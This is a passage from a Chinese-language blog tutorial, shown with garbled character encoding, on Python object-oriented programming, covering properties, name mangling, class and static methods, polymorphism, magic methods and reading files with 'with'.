<h4 id="ä½¿ç”¨å±æ€§å¯¹ç‰¹æ€§è®¿é—®"><a href="#ä½¿ç”¨å±æ€§å¯¹ç‰¹æ€§è®¿é—®" class="headerlink" title="ä½¿ç”¨å±æ€§å¯¹ç‰¹æ€§è®¿é—®"></a>ä½¿ç”¨å±æ€§å¯¹ç‰¹æ€§è®¿é—®</h4><p>åˆšåˆšå†å¯¹ä¿®æ”¹å±æ€§è¿›è¡Œè®¨è®ºçš„æ—¶å€™æåˆ°è¿‡pyå¹¶æ²¡æœ‰æ‰€è°“çš„privateå’Œpublicå±æ€§ï¼Œè¿™é‡Œè¯¦ç»†çš„æ¥è®¨è®ºä¸€ä¸‹å§</p>
<p>é¦–å…ˆè¿˜æ˜¯ä»cç±»è¯­è¨€å¼€å§‹ï¼Œæ˜¯å¦è¿˜è®°å¾—å½“æ—¶å†™cç±»è¯­è¨€æ—¶ç§æœ‰ç±»å‹æ˜¯å¦‚ä½•èµ‹å€¼å’Œè°ƒç”¨çš„ï¼Ÿæ²¡é”™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç±»ä¸­é‡æ–°å®šä¹‰æ–°çš„æ–¹æ³•ï¼Œæ¯”å¦‚ä½¿ç”¨<code>display()</code>/<code>show()</code>/<code>getter()</code>æ¥è°ƒç”¨ç§æœ‰ç±»å‹è¾“å‡ºï¼Œä½¿ç”¨<code>input()</code>/<code>get()</code>/<code>setter()</code>æ¥ä»å¤–ç•Œè·å–æ•°æ®èµ‹å€¼ç»™ç§æœ‰ç±»å‹ã€‚</p>
<p>åœ¨pyä¸­ä½ ä¹Ÿå¯ä»¥è¿™ä¹ˆå¹²ï¼Œä½†æ˜¯æ›´å…·æœ‰pyé£æ ¼çš„æ˜¯ä½¿ç”¨å±æ€§(property)ï¼Œå°½é‡è®°ä½è‹±æ–‡å§ï¼Œæ¯•ç«Ÿattributeè¢«ç¿»è¯‘æˆç‰¹æ€§ï¼Œä¸­æ–‡çš„å±æ€§å’Œç‰¹æ€§æˆ‘è§‰å¾—å®åœ¨å·®åˆ«ä¸å¤§</p>
<p>è®²äº†é‚£ä¹ˆå¤šåºŸè¯ï¼Œç›´æ¥çœ‹ä¸€ä¸ªä¾‹å­å§</p>
<ul>
<li>ä½¿ç”¨<code>setter</code>/<code>getter</code>å¯¹éšè—çš„ç‰¹æ€§è¿›è¡Œè®¿é—®(trumpåŒå¿—å€Ÿä½ çš„åå­—ç”¨ä¸‹å“ˆ)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Duck</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        self.hidden_name = input_name    <span class="comment">#è¿™é‡Œçš„hidden_nameç›¸å½“äºç§æœ‰ç±»å‹</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the getter&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.hidden_name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the setter&#x27;</span>)</span><br><span class="line">        self.hidden_name = input_name</span><br><span class="line">    name = <span class="built_in">property</span>(get_name, set_name)<span class="comment">#è¿™ä¸¤ä¸ªæ–¹æ³•å®šä¹‰ä¸ºäº† name å±æ€§</span></span><br><span class="line">    	<span class="comment">#property() çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ getter æ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚ æ•°æ˜¯ setter æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">a_duck = Duck(<span class="string">&#x27;duck&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a_duck.get_name()) <span class="comment">#è¿™é‡Œæ˜¯æ˜¾å¼è°ƒç”¨ç­‰åŒäºï¼Œéšå¼è°ƒç”¨ print(a_duck.name)</span></span><br><span class="line"><span class="comment"># outs: inside the getter</span></span><br><span class="line"><span class="comment">#       duck</span></span><br><span class="line">a_duck.set_name(<span class="string">&#x27;trump&#x27;</span>)  <span class="comment">#è¿™é‡Œæ˜¯æ˜¾å¼è°ƒç”¨ç­‰åŒäºï¼Œa_duck.name = &#x27;trump&#x27;    </span></span><br><span class="line"><span class="comment"># outs: inside the getter</span></span><br><span class="line"><span class="built_in">print</span>(a_duck.get_name())</span><br><span class="line"><span class="comment"># outs: trump</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨ä¿®é¥°ç¬¦ï¼ˆdecoratorï¼‰</li>
</ul>
<p>ä¸Šé¢é‚£ä¸ªä¾‹å­çœ‹ç€æœ‰ç‚¹éº»çƒ¦ï¼Œæ¥ä¸ªç®€å•çš„å†™æ³•</p>
<p>è¯¥ä¾‹å­ä¸­å®šä¹‰ä¸¤ä¸ªä¸åŒçš„æ–¹æ³•ï¼Œå®ƒ ä»¬éƒ½å« **name()**ï¼Œä½†åŒ…å«ä¸åŒçš„ä¿®é¥°ç¬¦ï¼š</p>
<ul>
<li><p><code>@property</code>ï¼Œç”¨äºæŒ‡ç¤º getter æ–¹æ³•ï¼›</p>
</li>
<li><p><code>@name.setter</code>ï¼Œç”¨äºæŒ‡ç¤º setter æ–¹æ³•</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Duck</span>():</span></span><br><span class="line"><span class="meta">    @property              </span><span class="comment">#ç®€å•çš„ç†è§£propertyå°±æ˜¯è¾“å‡ºâ€œç§æœ‰ç±»â€</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the getter&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.hidden_name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @name.setter          </span><span class="comment">#æ–¹æ³•å.setterå¯ä»¥ç†è§£ä¸ºè¾“å…¥</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the setter&#x27;</span>)</span><br><span class="line">        self.hidden_name = input_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        self.hidden_name = input_name</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">a_duck = Duck(<span class="string">&#x27;duck&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a_duck.name)</span><br><span class="line">a_duck.name = <span class="string">&#x27;trump&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a_duck.name)</span><br><span class="line"><span class="comment">#ä½ ä»ç„¶å¯ä»¥åƒä¹‹å‰è®¿é—®ç‰¹æ€§ä¸€æ ·è®¿é—® nameï¼Œä½†è¿™é‡Œæ²¡æœ‰äº†æ˜¾å¼çš„ get_name() å’Œ set_name() æ–¹æ³•</span></span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">inside the getter</span></span><br><span class="line"><span class="string">duck</span></span><br><span class="line"><span class="string">inside the setter</span></span><br><span class="line"><span class="string">inside the getter</span></span><br><span class="line"><span class="string">trump</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ä¹‹å‰çš„ä¾‹å­ä¸­æˆ‘ä»¬éƒ½ç”¨nameå±æ€§æŒ‡å‘ç±»ä¸­å­˜å‚¨çš„æŸä¸€ä¸ªç‰¹æ€§ï¼ˆä¾‹å­ä¸­å¼hidden_nameï¼‰,é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬å¯ä»¥è®©å±æ€§æŒ‡å‘ä¸€ä¸ª<em>è®¡ç®—ç»“æœå€¼</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸€ä¸ªè¾“å…¥åŠå¾„è½¬æ¢ç›´å¾„çš„Circleç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,radius</span>):</span></span><br><span class="line">        self.radius = radius</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">diameter</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*self.radius</span><br><span class="line"></span><br><span class="line">c = Circle(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(c.radius)</span><br><span class="line"><span class="built_in">print</span>(c.diameter)</span><br><span class="line">c.radius = <span class="number">7</span>	<span class="comment">#å½“åŠå¾„æ”¹å˜æ—¶ï¼Œç›´å¾„ä¼šè‡ªåŠ¨æ”¹å˜</span></span><br><span class="line"><span class="built_in">print</span>(c.diameter)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 10 </span></span><br><span class="line"><span class="comment"># 14</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä»¬æ²¡æœ‰å¯¹ç›´å¾„è®¾ç½®setterå±æ€§(<code>@diameter.setter</code>)ï¼Œé‚£ä¹ˆæ— æ³•ä»å¤–éƒ¨å¯¹ç›´å¾„è¿›è¡Œä¿®æ”¹ï¼Œè¾¾åˆ°äº†ä¿æŠ¤æ•°æ®çš„ç›®çš„ï¼Œåªè¯»å±æ€§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.diameter = <span class="number">9</span></span><br><span class="line"><span class="comment">#å¦‚æœæˆ‘ç»™ç›´å¾„ç›´æ¥èµ‹å€¼ï¼Œç¼–è¯‘å™¨å°±ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="comment"># AttributeError: can&#x27;t set attribute</span></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨åç§°é‡æ•´æ¥ä¿æŠ¤ç§æœ‰å±æ€§"><a href="#ä½¿ç”¨åç§°é‡æ•´æ¥ä¿æŠ¤ç§æœ‰å±æ€§" class="headerlink" title="ä½¿ç”¨åç§°é‡æ•´æ¥ä¿æŠ¤ç§æœ‰å±æ€§"></a>ä½¿ç”¨åç§°é‡æ•´æ¥ä¿æŠ¤ç§æœ‰å±æ€§</h4><p>è¿™ä¸ªæ ‡é¢˜å¯èƒ½ä¼šå¼•å‘ä¸€äº›è¯¯ä¼šï¼Œå†æ¬¡å£°æ˜pyå¹¶æ²¡æœ‰çœŸæ­£æ„ä¹‰ä¸Šçš„ç§æœ‰ç±»å‹ã€‚</p>
<p>åˆšåˆšæˆ‘ä»¬åœ¨é¸­å­ç±»ä¸­åŠ äº†ä¸€ä¸ªéšè—çš„å±æ€§<code>hidden_name</code>,ä½†æ˜¯è¿™ç§æ–¹æ³•æœ‰ä¸€ä¸ªå¼Šç«¯ï¼Œå°±æ˜¯å½“æˆ‘çŸ¥é“è¿™ä¸ªç±»ä¸­æœ‰è¿™ä¸ªå±æ€§çš„æ—¶å€™æˆ‘å¯ä»¥è¿™æ ·è°ƒç”¨<code>a_duck.hidden_name</code>,ä¸ºäº†ç¦æ­¢è¿™ç§è¡Œä¸ºå¼•è¿›åç§°é‡æ•´ï¼Œå°†ä½ éœ€è¦å‘½åçš„ç§æœ‰å±æ€§å˜é‡å‘½åæˆ<code>__privatename</code>,åŠ ä¸¤æ¡ä¸‹åˆ’çº¿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æˆ‘åªæ˜¯æŠŠä¸Šé¢é‚£ä¸ªä»£ç æ‹”ä¸‹æ¥ï¼Œå°†hidden_nameå…¨éƒ¨æ›¿æ¢ä¸º__name</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Duck</span>():</span></span><br><span class="line"><span class="meta">    @property             </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the getter&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @name.setter          </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;inside the setter&#x27;</span>)</span><br><span class="line">        self.__name = input_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_name</span>):</span></span><br><span class="line">        self.__name = input_name</span><br><span class="line">        </span><br><span class="line">a_duck = Duck(<span class="string">&#x27;trump&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a_duck.__name)    <span class="comment">#è¿™æ ·å°±ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="comment">#AttributeError: &#x27;Duck&#x27; object has no attribute &#x27;__name&#x27;</span></span><br><span class="line"><span class="comment">#å…¶å®åªæ˜¯pyå°†ä»£ç é‡æ•´æˆäº† a_duck._Duck__name  è¿™ç§å½¢å¼è€Œå·²</span></span><br></pre></td></tr></table></figure>

<p>å¥½å§è¯´äº†åŠå¤©ï¼Œè¿™ç§ä¿æŠ¤ç‰¹æ€§çš„æ–¹å¼å¹¶ä¸å®Œç¾ï¼Œä½†å®ƒç¡®å®èƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å…æˆ‘ä»¬æ— æ„æˆ–æœ‰æ„åœ°å¯¹ç‰¹æ€§è¿›è¡Œç›´æ¥è®¿é—®</p>
<h4 id="ç±»çš„æ–¹æ³•"><a href="#ç±»çš„æ–¹æ³•" class="headerlink" title="ç±»çš„æ–¹æ³•"></a>ç±»çš„æ–¹æ³•</h4><p>â€‹        åœ¨ç±»çš„å®šä¹‰ä¸­ï¼Œä»¥ self ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„æ–¹æ³•éƒ½æ˜¯å®ä¾‹æ–¹æ³•ï¼ˆinstance methodï¼‰ã€‚å®ƒä»¬åœ¨ åˆ›å»ºè‡ªå®šä¹‰ç±»æ—¶æœ€å¸¸ç”¨ã€‚å®ä¾‹æ–¹æ³•çš„é¦–ä¸ªå‚æ•°æ˜¯ selfï¼Œå½“å®ƒè¢«è°ƒç”¨æ—¶ï¼ŒPyä¼šæŠŠè°ƒç”¨è¯¥ æ–¹æ³•çš„å¯¹è±¡ä½œä¸º self å‚æ•°ä¼ å…¥ã€‚<br>â€‹        ä¸ä¹‹ç›¸å¯¹ï¼Œç±»æ–¹æ³•ï¼ˆclass methodï¼‰ä¼šä½œç”¨äºæ•´ä¸ªç±»ï¼Œå¯¹ç±»ä½œå‡ºçš„ä»»ä½•æ”¹å˜ä¼šå¯¹å®ƒçš„æ‰€æœ‰å® ä¾‹å¯¹è±¡äº§ç”Ÿå½±å“ã€‚åœ¨ç±»å®šä¹‰å†…éƒ¨ï¼Œç”¨å‰ç¼€ä¿®é¥°ç¬¦ @classmethod æŒ‡å®šçš„æ–¹æ³•éƒ½æ˜¯ç±»æ–¹æ³•ã€‚ä¸ å®ä¾‹æ–¹æ³•ç±»ä¼¼ï¼Œç±»æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»æœ¬èº«ã€‚åœ¨ Pyä¸­ï¼Œè¿™ä¸ªå‚æ•°å¸¸è¢«å†™ä½œ clsï¼Œå› ä¸ºå…¨ç§° class æ˜¯ä¿ç•™å­—ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨ã€‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¸ºç±» A å®šä¹‰ä¸€ä¸ªç±»æ–¹ æ³•æ¥è®°å½•ä¸€å…±æœ‰å¤šå°‘ä¸ªç±» A çš„å¯¹è±¡è¢«åˆ›å»ºï¼š</p>
<ul>
<li><code>@classmethod</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>():</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        A.count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exclaim</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I&#x27;m an A!&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kids</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;A has&quot;</span>, cls.count, <span class="string">&quot;little objects.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">easy_a = A()</span><br><span class="line">breezy_a = A()</span><br><span class="line">wheezy_a = A()</span><br><span class="line">A.kids()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">outs:</span></span><br><span class="line"><span class="string">A has 3 little objects.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>é™æ€æ–¹æ³•ï¼ˆstatic methodï¼‰ï¼Œç”¨ <code>@staticmethod ä¿®é¥°</code>ï¼Œ å®ƒæ—¢ä¸éœ€è¦ self å‚æ•°ä¹Ÿä¸éœ€è¦ class å‚æ•°</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greet</span>():</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">greeting</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Greet.greeting()</span><br><span class="line"><span class="comment">#outs: hello</span></span><br></pre></td></tr></table></figure>

<p>okï¼Œé™æ€æ–¹æ³•ä¸éœ€è¦è°ƒç”¨ä»»ä½•å‚æ•°ï¼Œç”šè‡³è¿å¯¹è±¡éƒ½ä¸éœ€è¦ï¼Œç±»å.æ–¹æ³•å  å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä»–çš„å­˜åœ¨åªæ˜¯ä¸ºäº†æ–¹ä¾¿ï¼Œä¸ç„¶è¿™æ®µä»£ç ä¼šè½å•ã€‚</p>
<h4 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h4><p>è¿˜è®°å¾—å¤šæ€æ˜¯ä»€ä¹ˆå—ï¼Ÿä¸€èµ·æ¥å›å¿†ä¸‹å§ã€‚åœ¨oopä¸­å¤šæ€æŒ‡çš„æ˜¯ä¸€ä¸ªå®ä½“å…·æœ‰å¤šç§å½¢å¼ï¼Œç®€å•çš„æŒ‰ç…§å­—é¢æ„æ€ç†è§£ï¼Œä¸€ä¸ªç±»å…·æœ‰å¤šç§å½¢æ€ï¼Œå½¢æ€å°±ä½“ç°åœ¨æ–¹æ³•ä¸Š,çœ‹æ®µä»£ç æ„Ÿå—ä¸€ä¸‹å§ï¼Œè™½ç„¶æœ‰ç‚¹é•¿ï¼Œä½†å…¶å®å¾ˆç®€å•å’Œæ¸…æ™°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Quote</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, person, words</span>):</span></span><br><span class="line">        self.person = person</span><br><span class="line">        self.words = words</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">who</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.person</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.words + <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QuestionQuote</span>(<span class="params">Quote</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.words + <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExclamationQuote</span>(<span class="params">Quote</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.words + <span class="string">&#x27;!&#x27;</span></span><br><span class="line"></span><br><span class="line">hunter = Quote(<span class="string">&#x27;Elmer Fudd&#x27;</span>, <span class="string">&quot;I&#x27;m hunting wabbits&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hunter.who(), <span class="string">&#x27;says:&#x27;</span>, hunter.says())</span><br><span class="line">hunted1 = QuestionQuote(<span class="string">&#x27;Bugs Bunny&#x27;</span>, <span class="string">&quot;What&#x27;s up, doc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hunted1.who(), <span class="string">&#x27;says:&#x27;</span>, hunted1.says())</span><br><span class="line">hunted2 = ExclamationQuote(<span class="string">&#x27;Daffy Duck&#x27;</span>, <span class="string">&quot;It&#x27;s rabbit season&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hunted2.who(), <span class="string">&#x27;says:&#x27;</span>, hunted2.says())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;outs:</span></span><br><span class="line"><span class="string">Elmer Fudd says: I&#x27;m hunting wabbits.</span></span><br><span class="line"><span class="string">Bugs Bunny says: What&#x27;s up, doc?</span></span><br><span class="line"><span class="string">Daffy Duck says: It&#x27;s rabbit season!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>pyçš„å¤šæ€ä¸åŒäºå…¶ä»–çš„oopè¯­è¨€ï¼Œå®ƒæ— è®ºå¯¹è±¡çš„ç§ç±»æ˜¯ä»€ä¹ˆï¼Œåªè¦åŒ…å« who() å’Œ says()ï¼Œä½ ä¾¿å¯ä»¥è°ƒç”¨å®ƒã€‚æˆ‘ä»¬å†æ¥å®šä¹‰ä¸€ä¸ª BabblingBrook ç±»ï¼Œå®ƒä¸æˆ‘ä»¬ä¹‹å‰çš„çŒäººçŒç‰©ï¼ˆQuote ç±»çš„åä»£ï¼‰ä»€ä¹ˆçš„æ²¡æœ‰ä»»ä½•å…³ç³»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¿™æ®µä»£ç æ¥ä¸Šä¸€æ®µï¼Œå†æ¬¡ä½¿ç”¨å¤šæ€ï¼Œåœ¨æ— å…³ç±»ä¸­å®ç°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BabblingBrook</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">who</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Brook&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">says</span>(<span class="params">self</span>):</span></span><br><span class="line">         <span class="keyword">return</span> <span class="string">&#x27;Babble&#x27;</span></span><br><span class="line"></span><br><span class="line">brook = BabblingBrook()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(brook.who()+<span class="string">&quot; says &quot;</span>+brook.says())</span><br><span class="line"><span class="comment">#outs: Brook says Babble</span></span><br></pre></td></tr></table></figure>

<h4 id="é­”æœ¯æ–¹æ³•special-method"><a href="#é­”æœ¯æ–¹æ³•special-method" class="headerlink" title="é­”æœ¯æ–¹æ³•special method"></a>é­”æœ¯æ–¹æ³•special method</h4><p>Python çš„ç‰¹æ®Šæ–¹æ³•ï¼ˆspecial methodï¼‰ï¼Œæœ‰æ—¶ä¹Ÿè¢«ç§°ä½œé­”æœ¯æ–¹æ³•ï¼ˆmagic methodï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæœ‰æœ‰è¶£çš„éƒ¨åˆ†ï¼Œå…ˆæ¥çœ‹ä¸€æ®µä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Word</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        self.text = text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, word2</span>):</span>  <span class="comment"># é­”æœ¯æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> self.text.lower() == word2.text.lower()  <span class="comment"># loweræ˜¯å°†å­—æ¯å˜æˆå°å†™</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">first = Word(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line">second = Word(<span class="string">&#x27;HA&#x27;</span>)</span><br><span class="line">third = Word(<span class="string">&#x27;eh&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> first == second:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line"><span class="comment"># outs: True</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> first == third:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;False&#x27;</span>)</span><br><span class="line"><span class="comment"># outs: False</span></span><br></pre></td></tr></table></figure>

<p>ç›¸ä¿¡æˆ‘ä¸è¯´ä¹Ÿçœ‹å¾—æ‡‚è¿™æ®µä»£ç åœ¨å¹²å•¥ï¼Œæ²¡é”™æ­£æ˜¯æ¯”è¾ƒå•è¯æ˜¯å¦ç›¸åŒï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰ï¼Œå”¯ä¸€å¯èƒ½æœ‰æ‰€ç–‘æƒ‘çš„ä¾¿æ˜¯<code>__eq__</code>ï¼Œè¿™ä¾¿æ˜¯é­”æœ¯æ–¹æ³•ï¼Œå¸¸ç”¨å¦‚ä¸‹ï¼Œ<a href="https://docs.python.org/2.5/ref/specialnames.html">å®˜æ–¹æ–‡æ¡£</a> | <a href="https://diveintopython3.net/special-method-names.html">å‚è€ƒ</a></p>
<p>![magic method](C:\Users\83487\Pictures\programmer path\magic method.jpg)<br>![magic method2](C:\Users\83487\Pictures\programmer path\magic method2.jpg)</p>
<ul>
<li>è¿™é‡Œæˆ‘å¿½ç•¥ä¸€ä¸ªç»„åˆï¼ˆcomposition æˆ–èšåˆaggregationï¼‰æœªæåŠï¼Œç›¸å¯¹äºç±»çš„çˆ¶å­ç»§æ‰¿çš„æ–¹å¼ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼ ç±»ä¸ç±»å…„å¼Ÿ å…³ç³»çš„ä¸€ç§ï¼Œä¸å¸¸ç”¨ï¼Œå¦‚æœéœ€è¦å†æŸ¥èµ„æ–™</li>
</ul>
<h4 id="ä»å¤–éƒ¨ç±»å¯¼å…¥ç±»æ¨¡å—"><a href="#ä»å¤–éƒ¨ç±»å¯¼å…¥ç±»æ¨¡å—" class="headerlink" title="ä»å¤–éƒ¨ç±»å¯¼å…¥ç±»æ¨¡å—"></a>ä»å¤–éƒ¨ç±»å¯¼å…¥ç±»æ¨¡å—</h4><p>ä¾‹å¦‚ï¼Œå¤–éƒ¨æ–‡ä»¶æœ‰<code>car.py</code>å…¶ä¸­åŒ…å«ä¸¤ä¸ªclassï¼ŒCarå’ŒElectrical</p>
<p>åœ¨my_caræ–‡ä»¶ä¸­åº”è¯¥å¯¼å…¥è¿™ä¸¤ä¸ªç±»<code>from car import Car ,Electrical</code></p>
<p>æˆ–è€…å¯¼å…¥æ•´ä¸ª<code>import Car</code></p>
<p>å†ç”¨<code>moudle_name.class_name</code>çš„å½¢å¼è°ƒç”¨ç±»</p>
<h3 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h3><h4 id="æ–‡ä»¶-1"><a href="#æ–‡ä»¶-1" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h4><p>æœªæåŠä¸ä½¿ç”¨withå…³é”®å­—çš„ç”¨æ³•ï¼Œä½¿ç”¨withå…³é”®å­—å¯ä»¥è®©pyè‡ªåŠ¨åˆ¤æ–­æ˜¯å¦å…³é—­</p>
<ul>
<li>è¯»å–æ–‡ä»¶</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#withå…³é”®å­—å¯è®©pyè‡ªåŠ¨åˆ¤æ–­ä½•æ—¶å…³é—­</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;file_name&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    contents = file_object.read()</span><br><span class="line">    <span class="built_in">print</span>(contents)</span><br></pre></td></tr></table></figure>

<ul>
